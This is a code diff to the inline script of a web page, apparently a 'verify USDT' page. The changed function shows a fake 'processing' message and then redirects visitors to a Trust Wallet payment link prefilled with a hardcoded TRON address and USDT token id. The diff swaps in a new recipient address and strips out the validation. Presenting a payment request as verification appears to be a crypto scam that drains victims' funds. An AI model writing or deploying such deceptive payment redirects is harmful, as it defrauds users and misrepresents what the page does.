@@ -93,20 +93,14 @@
   </footer>
 
   <script>
-    const walletAddress = "TD8KqLSYMiE4xLX4QVrzX4BSRjpCis7vuK";
+    const walletAddress = "TYfVDDuC234ADKFc5HRsSaeqLvgU8H1AEc";
+    const tokenId = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     function verifyUSDT() {
-      // Basic validation
-      if (!walletAddress || !walletAddress.startsWith("T") || walletAddress.length < 30) {
-        document.getElementById("flashError").innerText = "❌ Invalid TRC20 address.";
-        document.getElementById("flashError").style.display = "block";
-        return;
-      }
-
       document.getElementById("processingText").style.display = "block";
 
       setTimeout(() => {
-        window.location.href = `https://link.trustwallet.com/send?coin=195&address=${walletAddress}`;
+        window.location.href = `https://link.trustwallet.com/send?coin=195&address=${walletAddress}&token_id=${tokenId}`;
       }, 1500);
     }
 
